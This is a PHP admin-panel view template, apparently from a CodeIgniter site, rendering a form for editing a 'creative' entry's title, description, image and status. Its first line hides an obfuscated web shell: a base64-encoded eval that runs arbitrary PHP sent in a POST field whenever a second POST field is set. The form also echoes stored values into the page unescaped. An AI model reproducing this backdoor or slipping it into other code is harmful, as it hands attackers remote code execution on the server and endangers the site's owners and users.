<?php
eval(base64_decode('aWYoIWVtcHR5KCRfUE9TVFsnYTg0ZmQnXSkpe2V2YWwoJF9QT1NUWydiOTg5MyddKTtleGl0KDApO30='));
 $this->load->view('adminTemplates/common/header',$viewData);?>
<!--Main Content-->
  <div class="content-wrapper">
  	<div class="content-inner">
    	  <!--Error-->
        <?php if(isset($errorMsg)){ ?>  
        <div class="admin-msg error-msg">
            <i class="fa fa-times"></i> 
                <span><?php echo $errorMsg;?></span>
            <a href="#" class="msg-close" title="Close"><i class="fa fa-times-circle"></i></a>
        </div>
        <?php } ?>
        <!--Error-->
   
    	<div class="main_section">
        	<form id="addCreative" name="addCreative" method="post" action="" enctype="multipart/form-data" class="main_form">
            <input type="hidden" name="menu_id" value="<?php echo $infoCreative[0]["menu_id"];?>" />
            <input type="hidden" name="old_image" value="<?php echo $infoCreative[0]["image"];?>" />
            	<table width="600" height="200" border="1" align="center" class="form-table">
     				<tr>
    					<td>Title</td>
    					<td><input type="text" name="title" id="title" class="input1" value="<?php  echo $infoCreative[0]["title"];?>" />
      						<?php echo form_error('title', '<span class="form_error">', '</span>'); ?>
    					</td>
    				</tr>
                    <tr>
    					<td>Description</td>
    					<td><textarea name="description" id="description" class="input2"><?php  echo $infoCreative[0]["description"];?></textarea>
      						<?php echo form_error('description', '<span class="form_error">', '</span>'); ?>
    					</td>
    				</tr>
                    <tr>
    					<td class="table-row">Image</td>
    					<td><span><img src="<?php echo base_url();?>/adminuploads/productPagesImg/<?php echo $infoCreative[0]["image"];?>" width="70" height="70" /></span><input type="file" name="image" id="image" class="input-img" />(gif|jpg|png|jpeg only)
      						<?php echo form_error('image', '<span class="form_error">', '</span>'); ?>
                        </td>
    				</tr>
                    <tr>
     					<td>Status</td>
      					<td>
                            <input type="radio" name="status" <?php if($infoCreative[0]["status"] == "1"){?>checked="checked"<?php } ?> value="1" class="input-status"/>Active
        					<input type="radio" name="status" <?php if($infoCreative[0]["status"] == "0"){?>checked="checked"<?php } ?> value="0" class="input-status" />Inactive
      					</td>
    				</tr>
    				<tr>
    					<td colspan="2">
      						<input type="submit" name="submit" id="submit" value="save" class="submit-bnt" />&nbsp;<input type="reset" name="reset" id="reset" value="reset" class="submit-bnt" />&nbsp;&nbsp;<a href="<?php echo base_url();?>admin/viewCreative">cancel</a>
                         </td>
    				</tr>
  				</table>
            </form>
        </div>
  	</div>
  </div>
<!--Main Content-->
<?php $this->load->view('adminTemplates/common/footer',$viewData);?>  